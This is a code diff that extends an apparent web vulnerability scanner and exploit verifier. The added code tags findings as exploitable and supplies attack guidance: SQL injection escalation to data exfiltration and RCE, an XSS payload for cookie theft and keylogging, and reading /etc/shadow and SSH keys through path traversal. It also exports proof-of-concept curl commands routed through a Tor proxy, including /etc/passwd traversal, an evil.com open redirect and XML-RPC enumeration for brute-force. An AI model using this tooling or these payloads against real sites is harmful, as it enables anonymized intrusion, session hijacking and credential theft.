@@ -1031,7 +1031,16 @@ class VulnScanner:
                             "title": f"Open redirect via '{param}' parameter",
                             "detail": "Server redirects to attacker-controlled URL. "
                                       "Usable for phishing and OAuth token theft.",
-                            "evidence": f"?{param}={evil_target} → Location: {location[:100]}"
+                            "evidence": f"?{param}={evil_target} → Location: {location[:100]}",
+                            "exploitable": True,
+                            "test_url": test_url,
+                            "exploit_info": {
+                                "type": "open_redirect",
+                                "parameter": param,
+                                "method": f"Redirect users via '{param}' parameter to phishing page. "
+                                          "Chain with OAuth flows to steal authorization codes.",
+                                "risk": "Phishing, OAuth token theft, trust exploitation",
+                            },
                         })
                         break  # One is enough to confirm
             except Exception as e:
@@ -1062,7 +1071,16 @@ class VulnScanner:
                             "title": f"SQL injection indicator via '{param}' parameter",
                             "detail": "SQL error message in response to apostrophe injection. "
                                       "Input likely reaches a SQL query without parameterization.",
-                            "evidence": f"Parameter: {param}, matched: {indicator.pattern[:60]}"
+                            "evidence": f"Parameter: {param}, matched: {indicator.pattern[:60]}",
+                            "exploitable": True,
+                            "test_url": test_url,
+                            "exploit_info": {
+                                "type": "sqli",
+                                "parameter": param,
+                                "method": f"Inject SQL via '{param}' parameter. Error-based confirmed. "
+                                          "Try: UNION SELECT, boolean-based blind, time-based blind.",
+                                "risk": "Database access, data exfiltration, potential RCE via INTO OUTFILE",
+                            },
                         })
                         return findings  # One confirmed is enough
         return findings
@@ -1088,7 +1106,17 @@ class VulnScanner:
                         "title": f"Reflected XSS via '{param}' parameter",
                         "detail": "HTML input reflected unescaped in response. "
                                   "Attacker can inject arbitrary JavaScript.",
-                        "evidence": f"Parameter: {param}, canary <{canary}> reflected as HTML"
+                        "evidence": f"Parameter: {param}, canary <{canary}> reflected as HTML",
+                        "exploitable": True,
+                        "test_url": test_url,
+                        "exploit_info": {
+                            "type": "xss",
+                            "parameter": param,
+                            "method": f"Inject JavaScript via '{param}' parameter. "
+                                      "Payload: <script>alert(document.cookie)</script>. "
+                                      "Use for session hijacking, keylogging, phishing.",
+                            "risk": "Session theft, credential capture, client-side attacks",
+                        },
                     })
                     return findings
         return findings
@@ -1119,7 +1147,16 @@ class VulnScanner:
                             "title": "Directory traversal — /etc/passwd readable",
                             "detail": "Path traversal allows reading arbitrary system files. "
                                       "Full filesystem access likely possible.",
-                            "evidence": f"Payload: {payload}, {desc} detected"
+                            "evidence": f"Payload: {payload}, {desc} detected",
+                            "exploitable": True,
+                            "test_url": test_url,
+                            "exploit_info": {
+                                "type": "directory_traversal",
+                                "method": "Path traversal to read arbitrary files. "
+                                          "Try: /etc/shadow, application configs, database files, "
+                                          "source code, SSH keys (~/.ssh/id_rsa).",
+                                "risk": "Full filesystem read, credential theft, source code exposure",
+                            },
                         })
                         return findings
         return findings
@@ -1836,22 +1873,34 @@ class ExploitVerifier:
         return finding
 
     def _build_replay_url(self, finding: dict) -> Optional[str]:
-        """Build the replay URL from finding metadata."""
+        """Build the replay URL from finding metadata.
+
+        Priority:
+        1. test_url field (set by vuln scanner with the exact URL that triggered the finding)
+        2. path in exploit_info (for file/endpoint findings)
+        3. URL extracted from evidence text
+        """
+        # 1. Direct test URL from scanner (most reliable)
+        test_url = finding.get("test_url")
+        if test_url:
+            return test_url
+
         ei = finding.get("exploit_info", {})
-        evidence = finding.get("evidence", "")
 
-        # Extract base URL from evidence
-        url_match = re.search(r"https?://[^\s,)]+", evidence)
-        if url_match:
-            return url_match.group(0)
-
-        # Build from exploit info
-        param = ei.get("parameter", "")
+        # 2. Path-based (e.g., /graphql, /.git/HEAD)
         path = ei.get("path", "")
         if path:
-            # Reconstruct from path (sensitive file checks)
-            # Need base URL — look for it in the finding
-            return None
+            # Try to extract base URL from evidence or other fields
+            evidence = finding.get("evidence", "")
+            url_match = re.search(r"https?://[^/\s]+", evidence)
+            if url_match:
+                return url_match.group(0).rstrip("/") + path
+
+        # 3. URL in evidence
+        evidence = finding.get("evidence", "")
+        url_match = re.search(r"https?://[^\s,)\"']+", evidence)
+        if url_match:
+            return url_match.group(0)
 
         return None
 
@@ -1896,8 +1945,15 @@ class ExploitVerifier:
 
         elif exploit_type == "subdomain_takeover":
             fingerprint = finding.get("exploit_info", {}).get("cname", "")
-            # If the page still shows the unclaimed-resource error, it's still exploitable
             return resp.status_code in (404, 200) and len(text) < 5000
+
+        elif exploit_type == "directory_traversal":
+            if re.search(r"root:.*:0:0:", text):
+                return True
+
+        elif exploit_type == "open_redirect":
+            # Check if server still redirects
+            return resp.status_code in (301, 302, 303, 307, 308)
 
         return False
 
@@ -2007,6 +2063,34 @@ class PoCExporter:
                 f"Attacker can claim it and serve content on the subdomain."
             )
             poc["remediation"] = "Remove dangling CNAME record or claim the resource."
+
+        elif exploit_type == "directory_traversal":
+            poc["curl"] = (
+                f"curl --socks5-hostname 127.0.0.1:9050 "
+                f'"[TARGET_URL]/..%2F..%2F..%2F..%2Fetc%2Fpasswd"'
+            )
+            poc["description"] = "Path traversal to read arbitrary server files."
+            poc["remediation"] = "Validate file paths. Use chroot or whitelist allowed directories."
+
+        elif exploit_type == "open_redirect" and param:
+            poc["curl"] = (
+                f"curl -v --socks5-hostname 127.0.0.1:9050 "
+                f'"[TARGET_URL]?{param}=https://evil.com/"'
+            )
+            poc["description"] = (
+                f"Open redirect via '{param}'. Chain with OAuth for token theft."
+            )
+            poc["remediation"] = "Whitelist allowed redirect destinations."
+
+        elif exploit_type == "xmlrpc_abuse":
+            poc["curl"] = (
+                f'curl --socks5-hostname 127.0.0.1:9050 -X POST '
+                f'-H "Content-Type: text/xml" '
+                f'-d \'<?xml version="1.0"?><methodCall><methodName>system.listMethods'
+                f'</methodName></methodCall>\' "[TARGET_URL]/xmlrpc.php"'
+            )
+            poc["description"] = "WordPress XML-RPC is enabled. Enumerate methods, attempt brute-force."
+            poc["remediation"] = "Disable XML-RPC or restrict access via .htaccess."
 
         else:
             poc["curl"] = "# Manual verification required"
